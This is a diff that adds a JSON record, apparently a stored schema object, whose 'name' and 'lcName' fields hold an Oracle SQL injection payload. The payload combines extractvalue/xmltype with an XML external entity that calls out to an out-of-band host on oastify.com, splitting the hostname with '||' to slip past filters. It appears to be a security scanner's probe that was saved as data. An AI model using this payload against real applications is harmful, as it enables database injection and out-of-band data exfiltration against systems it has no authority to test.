@@ -1,0 +1,33 @@
+{
+	"createdTime":1736635073649,
+	"deleted":false,
+	"description":"otAyeP",
+	"id":"6782f2c144ce135db1da46d3",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":854,
+	"lcName":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"utf-8\"?><!doctype root [ <!entity % slafx system \"http://wrr48lqpnakmxa8ww51kj99qwh2aq8eb23ptdi.oasti'||'fy.com/\">%slafx;]>'),'/l') from dual)",
+	"modifiedTime":1736635073649,
+	"name":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % slafx SYSTEM \"http://wrr48lqpnakmxa8ww51kj99qwh2aq8eb23ptdi.oasti'||'fy.com/\">%slafx;]>'),'/l') from dual)",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":854,
+	"standard":false,
+	"version":0
+}
